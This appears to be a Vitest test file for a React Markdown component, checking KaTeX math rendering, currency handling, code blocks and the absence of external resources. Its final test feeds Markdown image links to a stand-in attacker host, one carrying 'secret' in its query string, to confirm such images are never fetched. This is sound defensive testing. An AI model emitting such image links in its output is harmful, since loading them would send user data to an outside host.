import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "./Markdown";

const tex = (root: ParentNode) => Array.from(root.querySelectorAll('annotation[encoding="application/x-tex"]')).map((a) => a.textContent);

describe("Markdown math", () => {
  it("renders inline $…$ and \\(…\\) with KaTeX (the TeX source rides in the MathML annotation)", () => {
    const { container } = render(<Markdown text={"Euler: $e^{i\\pi}+1=0$ and \\(a_1 + b_1\\) here."} />);
    expect(container.querySelectorAll(".katex")).toHaveLength(2);
    expect(container.querySelector(".katex-display")).toBeNull();
    expect(tex(container)).toEqual(["e^{i\\pi}+1=0", "a_1 + b_1"]);
    expect(container.textContent).toContain("Euler:");
  });

  it("renders display $$…$$ (block and written inline) and \\[…\\] as display math", () => {
    const { container } = render(<Markdown text={"Before\n\n$$\n\\int_0^1 x\\,dx = \\tfrac12\n$$\n\nThen $$a^2+b^2=c^2$$ inline-written, and\n\n\\[ \\sum_{k=1}^n k \\]\n"} />);
    expect(container.querySelectorAll(".katex-display")).toHaveLength(3);
    expect(tex(container)).toEqual(["\\int_0^1 x\\,dx = \\tfrac12", "a^2+b^2=c^2", "\\sum_{k=1}^n k"]);
  });

  it("does not treat currency as math", () => {
    const { container } = render(<Markdown text={"It costs $5 and $10, or $ 5 and 7 $ total."} />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toBe("It costs $5 and $10, or $ 5 and 7 $ total.");
  });

  it("keeps real math next to currency", () => {
    const { container } = render(<Markdown text={"Pay $5 now; the rate is $r$ per month and $x^2$ grows."} />);
    expect(tex(container)).toEqual(["r", "x^2"]);
    expect(container.textContent).toContain("Pay $5 now;");
  });

  it("never renders math inside code: inline code, fenced blocks and ```math fences stay code", () => {
    const md = "Use `$x^2$` inline.\n\n```js\nconst a = '$y$'; // \\(z\\)\n```\n\n```math\nq^2\n```\n";
    const { container } = render(<Markdown text={md} />);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("$x^2$");
    expect(container.textContent).toContain("const a = '$y$'; // \\(z\\)");
    expect(container.textContent).toContain("q^2");
  });

  it("a formula with bad TeX shows an error span and does not throw", () => {
    const { container } = render(<Markdown text={"Broken: $\\frac{1}{$ ok"} />);
    expect(container.textContent).toContain("Broken:");
    expect(container.querySelector(".katex-error")).not.toBeNull();
  });

  it("emphasis characters inside math are not Markdown", () => {
    const { container } = render(<Markdown text={"We have $a_1 * b_1 + c_1$ then *emphasis*."} />);
    expect(tex(container)).toEqual(["a_1 * b_1 + c_1"]);
    expect(container.querySelector("em")?.textContent).toBe("emphasis");
  });

  it("ships KaTeX's markup without external references (no CDN)", () => {
    const { container } = render(<Markdown text={"$x$"} />);
    // the only URL is the MathML namespace; nothing is fetched (no links, sources or style urls)
    expect(container.innerHTML).not.toMatch(/\b(?:href|src)=|url\(|<link|<script|<img/);
  });

  it("never fetches an external image: it shows as a link; hub images load (react-markdown drops data: URLs)", () => {
    const { container } = render(<Markdown text={"![chart](https://evil.example/p.png?d=secret) ![dot](data:image/png;base64,iVBORw0KGgo=) ![hub](/api/files/raw?path=a.png) ![proto](//evil.example/x.png)"} />);
    const imgs = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(imgs).toEqual(["/api/files/raw?path=a.png"]);
    const links = [...container.querySelectorAll('[data-testid="external-image"]')];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://evil.example/p.png?d=secret", "//evil.example/x.png"]);
    expect(links[0]!.textContent).toContain("chart");
  });
});
